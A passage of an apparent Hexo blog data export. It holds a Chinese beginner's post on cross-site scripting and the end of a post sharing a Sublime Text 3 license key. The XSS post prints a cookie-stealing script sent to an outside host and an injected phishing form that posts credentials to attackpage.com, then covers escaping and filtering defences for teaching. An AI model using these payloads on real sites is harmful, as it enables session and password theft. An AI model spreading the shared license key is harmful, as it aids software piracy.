2FB88078\n90F5CC94 1CDC92DC 8457107A F151657B\n1D22E383 A997F016 42397640 33F41CFC\nE1D0AE85 A0BBD039 0E9C8D55 E1B89D5D\n5CDB7036 E56DE1C0 EFCC0840 650CD3A6\nB98FC99C 8FAC73EE D2B95564 DF450523\n—— END LICENSE ——\n```","slug":"article/tool/Sublime Text 3序列号","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxuj006h5nbtgwrbym3g","content":"<p>分享Sublime Text 3序列号一枚：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">—– BEGIN LICENSE —–</div><div class=\"line\">Andrew Weber</div><div class=\"line\">Single User License</div><div class=\"line\">EA7E-855605</div><div class=\"line\">813A03DD 5E4AD9E6 6C0EEB94 BC99798F</div><div class=\"line\">942194A6 02396E98 E62C9979 4BB979FE</div><div class=\"line\">91424C9D A45400BF F6747D88 2FB88078</div><div class=\"line\">90F5CC94 1CDC92DC 8457107A F151657B</div><div class=\"line\">1D22E383 A997F016 42397640 33F41CFC</div><div class=\"line\">E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D</div><div class=\"line\">5CDB7036 E56DE1C0 EFCC0840 650CD3A6</div><div class=\"line\">B98FC99C 8FAC73EE D2B95564 DF450523</div><div class=\"line\">—— END LICENSE ——</div></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<p>分享Sublime Text 3序列号一枚：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">—– BEGIN LICENSE —–</div><div class=\"line\">Andrew Weber</div><div class=\"line\">Single User License</div><div class=\"line\">EA7E-855605</div><div class=\"line\">813A03DD 5E4AD9E6 6C0EEB94 BC99798F</div><div class=\"line\">942194A6 02396E98 E62C9979 4BB979FE</div><div class=\"line\">91424C9D A45400BF F6747D88 2FB88078</div><div class=\"line\">90F5CC94 1CDC92DC 8457107A F151657B</div><div class=\"line\">1D22E383 A997F016 42397640 33F41CFC</div><div class=\"line\">E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D</div><div class=\"line\">5CDB7036 E56DE1C0 EFCC0840 650CD3A6</div><div class=\"line\">B98FC99C 8FAC73EE D2B95564 DF450523</div><div class=\"line\">—— END LICENSE ——</div></pre></td></tr></table></figure></p>\n"},{"title":"WEB安全初探之XSS","date":"2016-03-09T07:48:00.000Z","_content":"\n<img src=\"/asserts/images/logo/xss.png\" class=\"img-logo img-center\" />\n\n\nXSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。\n\n## 0x01 XSS攻击的分类\n根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。\n\n### 1. 反射型XSS\n反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。\n攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。\n\n### 2. 存储型XSS\n存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。\n\n\n## 0x02 XSS攻击的手段及其危害\n\n### 1. 窃取Cookie\n具体实现方法：\n先构造语句`<script>window.open('http://dlgyi.rrvv.net/cookie.asp?msg='+document.cookie)</script>`\n这句话意思是打开一个新的窗口，访问http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。\n\n### 2. 引导钓鱼\n``` html\n<script>\nfunction hack()\n{\n                   location.replace(“http://www.attackpage.com/record.asp?username=“\n+document.forms[0].user.value + “password=” + document.forms[0].pass.value);\n}\n</script>\n<form>\n<br><br><HR><H3>这个功能需要登录:</H3 >\n<br><br>请输入用户名：<br>\n<input type=”text” id=”user”name=”user”>\n<br>请输入密码：<br>\n<input type=”password” name =“pass”>\n<br><input type=”submit”name=”login” value=”登录”onclick=”hack()”>\n</form><br><br><HR>\n```\n注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。\n\n\n<!-- more -->\n\n## 0x03 XSS的预防\n\n### 1. 前端过滤XSS\n``` javascript\nfunction xssCheck(str,reg){\n    return str ? str.replace(reg || /[&<\">'](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g, function (a, b) {\n        if(b){\n            return a;\n        }else{\n            return {\n                '<':'&lt;',\n                '&':'&amp;',\n                '\"':'&quot;',\n                '>':'&gt;',\n                \"'\":'&#39;',\n            }[a]\n        }\n    }) : '';\n}\n```\n\n### 2. 后端预防\n\n#### spring提供的方法\n``` xml\n<context-param>\n   <param-name>defaultHtmlEscape</param-name>\n   <param-value>true</param-value>\n</context-param>\n\nForms加上：<spring:htmlEscape defaultHtmlEscape=\"true\" />\n```\n\n#### 手动escape\n首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);\n\n#### 后台加Filter\n``` java\nprivate String cleanXSS(String value) {\n    //You'll need to remove the spaces from the html entities below\n    value = value.replaceAll(\"<\", \"& lt;\").replaceAll(\">\", \"& gt;\");\n    value = value.replaceAll(\"\\\\(\", \"& #40;\").replaceAll(\"\\\\)\", \"& #41;\");\n    value = value.replaceAll(\"'\", \"& #39;\");\n    value = value.replaceAll(\"eval\\\\((.*)\\\\)\", \"\");\n    value = value.replaceAll(\"[\\\\\\\"\\\\\\'][\\\\s]*javascript:(.*)[\\\\\\\"\\\\\\']\", \"\\\"\\\"\");\n    value = value.replaceAll(\"script\", \"\");\n    return value;\n}\n```\n\n\n## 0x04 一款XSS漏洞检测爬虫 - XSScrapy\n``` bash\n./xsscrapy.py -u http://example.com\n./xsscrapy.py -u http://example.com/login_page -l loginname\n```\n\n\n## 0x05 XSS练习\nhttp://vulnweb.janusec.com/index-xss.php\n\n\n## 0x06 推荐站点\n- [WooYun知识库](http://drops.wooyun.org/)\n- [FreeBuf黑客与极客](http://www.freebuf.com/)\n- [SecWiki](http://www.sec-wiki.com/index.php)\n\n\n## 0x07 参考文档\n- [XSS的原理分析与解剖](http://www.freebuf.com/articles/web/40520.html)\n- [XSS的原理分析与解剖（第二篇）](http://www.freebuf.com/articles/web/42727.html)\n- [前端防御XSS](http://drops.wooyun.org/web/13009)\n- [Spring MVC防御CSRF、XSS和SQL注入攻击](http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html)\n- [快速、直接的XSS漏洞检测爬虫 – XSScrapy](http://itindex.net/detail/51089-xss-xsscrapy)\n- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)","source":"_posts/article/security/WEB安全初探之XSS.md","raw":"title: WEB安全初探之XSS\ntags:\n  - XSS\ncategories:\n  - 信息安全\ndate: 2016-03-09 15:48:00\n---\n\n<img src=\"/asserts/images/logo/xss.png\" class=\"img-logo img-center\" />\n\n\nXSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。\n\n## 0x01 XSS攻击的分类\n根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。\n\n### 1. 反射型XSS\n反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。\n攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。\n\n### 2. 存储型XSS\n存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。\n\n\n## 0x02 XSS攻击的手段及其危害\n\n### 1. 窃取Cookie\n具体实现方法：\n先构造语句`<script>window.open('http://dlgyi.rrvv.net/cookie.asp?msg='+document.cookie)</script>`\n这句话意思是打开一个新的窗口，访问http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。\n\n### 2. 引导钓鱼\n``` html\n<script>\nfunction hack()\n{\n                   location.replace(“http://www.attackpage.com/record.asp?username=“\n+document.forms[0].user.value + “password=” + document.forms[0].pass.value);\n}\n</script>\n<form>\n<br><br><HR><H3>这个功能需要登录:</H3 >\n<br><br>请输入用户名：<br>\n<input type=”text” id=”user”name=”user”>\n<br>请输入密码：<br>\n<input type=”password” name =“pass”>\n<br><input type=”submit”name=”login” value=”登录”onclick=”hack()”>\n</form><br><br><HR>\n```\n注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。\n\n\n<!-- more -->\n\n## 0x03 XSS的预防\n\n### 1. 前端过滤XSS\n``` javascript\nfunction xssCheck(str,reg){\n    return str ? str.replace(reg || /[&<\">'](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g, function (a, b) {\n        if(b){\n            return a;\n        }else{\n            return {\n                '<':'&lt;',\n                '&':'&amp;',\n                '\"':'&quot;',\n                '>':'&gt;',\n                \"'\":'&#39;',\n            }[a]\n        }\n    }) : '';\n}\n```\n\n### 2. 后端预防\n\n#### spring提供的方法\n``` xml\n<context-param>\n   <param-name>defaultHtmlEscape</param-name>\n   <param-value>true</param-value>\n</context-param>\n\nForms加上：<spring:htmlEscape defaultHtmlEscape=\"true\" />\n```\n\n#### 手动escape\n首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);\n\n#### 后台加Filter\n``` java\nprivate String cleanXSS(String value) {\n    //You'll need to remove the spaces from the html entities below\n    value = value.replaceAll(\"<\", \"& lt;\").replaceAll(\">\", \"& gt;\");\n    value = value.replaceAll(\"\\\\(\", \"& #40;\").replaceAll(\"\\\\)\", \"& #41;\");\n    value = value.replaceAll(\"'\", \"& #39;\");\n    value = value.replaceAll(\"eval\\\\((.*)\\\\)\", \"\");\n    value = value.replaceAll(\"[\\\\\\\"\\\\\\'][\\\\s]*javascript:(.*)[\\\\\\\"\\\\\\']\", \"\\\"\\\"\");\n    value = value.replaceAll(\"script\", \"\");\n    return value;\n}\n```\n\n\n## 0x04 一款XSS漏洞检测爬虫 - XSScrapy\n``` bash\n./xsscrapy.py -u http://example.com\n./xsscrapy.py -u http://example.com/login_page -l loginname\n```\n\n\n## 0x05 XSS练习\nhttp://vulnweb.janusec.com/index-xss.php\n\n\n## 0x06 推荐站点\n- [WooYun知识库](http://drops.wooyun.org/)\n- [FreeBuf黑客与极客](http://www.freebuf.com/)\n- [SecWiki](http://www.sec-wiki.com/index.php)\n\n\n## 0x07 参考文档\n- [XSS的原理分析与解剖](http://www.freebuf.com/articles/web/40520.html)\n- [XSS的原理分析与解剖（第二篇）](http://www.freebuf.com/articles/web/42727.html)\n- [前端防御XSS](http://drops.wooyun.org/web/13009)\n- [Spring MVC防御CSRF、XSS和SQL注入攻击](http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html)\n- [快速、直接的XSS漏洞检测爬虫 – XSScrapy](http://itindex.net/detail/51089-xss-xsscrapy)\n- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)","slug":"article/security/WEB安全初探之XSS","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxul006l5nbtamrnvs9u","content":"<p><img src=\"/asserts/images/logo/xss.png\" class=\"img-logo img-center\"></p>\n<p>XSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。</p>\n<h2 id=\"0x01-XSS攻击的分类\"><a href=\"#0x01-XSS攻击的分类\" class=\"headerlink\" title=\"0x01 XSS攻击的分类\"></a>0x01 XSS攻击的分类</h2><p>根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。</p>\n<h3 id=\"1-反射型XSS\"><a href=\"#1-反射型XSS\" class=\"headerlink\" title=\"1. 反射型XSS\"></a>1. 反射型XSS</h3><p>反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。<br>攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。</p>\n<h3 id=\"2-存储型XSS\"><a href=\"#2-存储型XSS\" class=\"headerlink\" title=\"2. 存储型XSS\"></a>2. 存储型XSS</h3><p>存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。</p>\n<h2 id=\"0x02-XSS攻击的手段及其危害\"><a href=\"#0x02-XSS攻击的手段及其危害\" class=\"headerlink\" title=\"0x02 XSS攻击的手段及其危害\"></a>0x02 XSS攻击的手段及其危害</h2><h3 id=\"1-窃取Cookie\"><a href=\"#1-窃取Cookie\" class=\"headerlink\" title=\"1. 窃取Cookie\"></a>1. 窃取Cookie</h3><p>具体实现方法：<br>先构造语句<code>&lt;script&gt;window.open(&#39;http://dlgyi.rrvv.net/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt;</code><br>这句话意思是打开一个新的窗口，访问<a href=\"http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。\" target=\"_blank\" rel=\"external\">http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。</a></p>\n<h3 id=\"2-引导钓鱼\"><a href=\"#2-引导钓鱼\" class=\"headerlink\" title=\"2. 引导钓鱼\"></a>2. 引导钓鱼</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hack</span>(<span class=\"params\"></span>)</span></div><div class=\"line\">&#123;</div><div class=\"line\">                   location.replace(“http:<span class=\"comment\">//www.attackpage.com/record.asp?username=“</span></div><div class=\"line\">+<span class=\"built_in\">document</span>.forms[<span class=\"number\">0</span>].user.value + “password=” + <span class=\"built_in\">document</span>.forms[<span class=\"number\">0</span>].pass.value);</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">HR</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">H3</span>&gt;</span>这个功能需要登录:<span class=\"tag\">&lt;/<span class=\"name\">H3</span> &gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>请输入用户名：<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">”text”</span> <span class=\"attr\">id</span>=<span class=\"string\">”user”name</span>=<span class=\"string\">”user”</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>请输入密码：<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">”password”</span> <span class=\"attr\">name</span> =<span class=\"string\">“pass”</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">”submit”name</span>=<span class=\"string\">”login”</span> <span class=\"attr\">value</span>=<span class=\"string\">”登录”onclick</span>=<span class=\"string\">”hack()”</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">HR</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。</p>\n<a id=\"more\"></a>\n<h2 id=\"0x03-XSS的预防\"><a href=\"#0x03-XSS的预防\" class=\"headerlink\" title=\"0x03 XSS的预防\"></a>0x03 XSS的预防</h2><h3 id=\"1-前端过滤XSS\"><a href=\"#1-前端过滤XSS\" class=\"headerlink\" title=\"1. 前端过滤XSS\"></a>1. 前端过滤XSS</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">xssCheck</span>(<span class=\"params\">str,reg</span>)</span>&#123;</div><div class=\"line\">    <span class=\"keyword\">return</span> str ? str.replace(reg || <span class=\"regexp\">/[&amp;&lt;\"&gt;'](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">a, b</span>) </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span>(b)&#123;</div><div class=\"line\">            <span class=\"keyword\">return</span> a;</div><div class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">            <span class=\"keyword\">return</span> &#123;</div><div class=\"line\">                <span class=\"string\">'&lt;'</span>:<span class=\"string\">'&amp;lt;'</span>,</div><div class=\"line\">                <span class=\"string\">'&amp;'</span>:<span class=\"string\">'&amp;amp;'</span>,</div><div class=\"line\">                <span class=\"string\">'\"'</span>:<span class=\"string\">'&amp;quot;'</span>,</div><div class=\"line\">                <span class=\"string\">'&gt;'</span>:<span class=\"string\">'&amp;gt;'</span>,</div><div class=\"line\">                <span class=\"string\">\"'\"</span>:<span class=\"string\">'&amp;#39;'</span>,</div><div class=\"line\">            &#125;[a]</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;) : <span class=\"string\">''</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"2-后端预防\"><a href=\"#2-后端预防\" class=\"headerlink\" title=\"2. 后端预防\"></a>2. 后端预防</h3><h4 id=\"spring提供的方法\"><a href=\"#spring提供的方法\" class=\"headerlink\" title=\"spring提供的方法\"></a>spring提供的方法</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>defaultHtmlEscape<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\">Forms加上：<span class=\"tag\">&lt;<span class=\"name\">spring:htmlEscape</span> <span class=\"attr\">defaultHtmlEscape</span>=<span class=\"string\">\"true\"</span> /&gt;</span></div></pre></td></tr></table></figure>\n<h4 id=\"手动escape\"><a href=\"#手动escape\" class=\"headerlink\" title=\"手动escape\"></a>手动escape</h4><p>首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);</p>\n<h4 id=\"后台加Filter\"><a href=\"#后台加Filter\" class=\"headerlink\" title=\"后台加Filter\"></a>后台加Filter</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> String <span class=\"title\">cleanXSS</span><span class=\"params\">(String value)</span> </span>&#123;</div><div class=\"line\">    <span class=\"comment\">//You'll need to remove the spaces from the html entities below</span></div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"&lt;\"</span>, <span class=\"string\">\"&amp; lt;\"</span>).replaceAll(<span class=\"string\">\"&gt;\"</span>, <span class=\"string\">\"&amp; gt;\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"\\\\(\"</span>, <span class=\"string\">\"&amp; #40;\"</span>).replaceAll(<span class=\"string\">\"\\\\)\"</span>, <span class=\"string\">\"&amp; #41;\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"'\"</span>, <span class=\"string\">\"&amp; #39;\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"eval\\\\((.*)\\\\)\"</span>, <span class=\"string\">\"\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"[\\\\\\\"\\\\\\'][\\\\s]*javascript:(.*)[\\\\\\\"\\\\\\']\"</span>, <span class=\"string\">\"\\\"\\\"\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"script\"</span>, <span class=\"string\">\"\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> value;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"0x04-一款XSS漏洞检测爬虫-XSScrapy\"><a href=\"#0x04-一款XSS漏洞检测爬虫-XSScrapy\" class=\"headerlink\" title=\"0x04 一款XSS漏洞检测爬虫 - XSScrapy\"></a>0x04 一款XSS漏洞检测爬虫 - XSScrapy</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">./xsscrapy.py -u http://example.com</div><div class=\"line\">./xsscrapy.py -u http://example.com/login_page <span class=\"_\">-l</span> loginname</div></pre></td></tr></table></figure>\n<h2 id=\"0x05-XSS练习\"><a href=\"#0x05-XSS练习\" class=\"headerlink\" title=\"0x05 XSS练习\"></a>0x05 XSS练习</h2><p><a href=\"http://vulnweb.janusec.com/index-xss.php\" target=\"_blank\" rel=\"external\">http://vulnweb.janusec.com/index-xss.php</a></p>\n<h2 id=\"0x06-推荐站点\"><a href=\"#0x06-推荐站点\" class=\"headerlink\" title=\"0x06 推荐站点\"></a>0x06 推荐站点</h2><ul>\n<li><a href=\"http://drops.wooyun.org/\" target=\"_blank\" rel=\"external\">WooYun知识库</a></li>\n<li><a href=\"http://www.freebuf.com/\" target=\"_blank\" rel=\"external\">FreeBuf黑客与极客</a></li>\n<li><a href=\"http://www.sec-wiki.com/index.php\" target=\"_blank\" rel=\"external\">SecWiki</a></li>\n</ul>\n<h2 id=\"0x07-参考文档\"><a href=\"#0x07-参考文档\" class=\"headerlink\" title=\"0x07 参考文档\"></a>0x07 参考文档</h2><ul>\n<li><a href=\"http://www.freebuf.com/articles/web/40520.html\" target=\"_blank\" rel=\"external\">XSS的原理分析与解剖</a></li>\n<li><a href=\"http://www.freebuf.com/articles/web/42727.html\" target=\"_blank\" rel=\"external\">XSS的原理分析与解剖（第二篇）</a></li>\n<li><a href=\"http://drops.wooyun.org/web/13009\" target=\"_blank\" rel=\"external\">前端防御XSS</a></li>\n<li><a href=\"http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html\" target=\"_blank\" rel=\"external\">Spring MVC防御CSRF、XSS和SQL注入攻击</a></li>\n<li><a href=\"http://itindex.net/detail/51089-xss-xsscrapy\" target=\"_blank\" rel=\"external\">快速、直接的XSS漏洞检测爬虫 – XSScrapy</a></li>\n<li><a href=\"https://github.com/DanMcInerney/xsscrapy\" target=\"_blank\" rel=\"external\">xsscrapy</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/xss.png\" class=\"img-logo img-center\" /></p>\n<p>XSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。</p>\n<h2 id=\"0x01-XSS攻击的分类\"><a href=\"#0x01-XSS攻击的分类\" class=\"headerlink\" title=\"0x01 XSS攻击的分类\"></a>0x01 XSS攻击的分类</h2><p>根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。</p>\n<h3 id=\"1-反射型XSS\"><a href=\"#1-反射型XSS\" class=\"headerlink\" title=\"1. 反射型XSS\"></a>1. 反射型XSS</h3><p>反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。<br>攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。</p>\n<h3 id=\"2-存储型XSS\"><a href=\"#2-存储型XSS\" class=\"headerlink\" title=\"2. 存储型XSS\"></a>2. 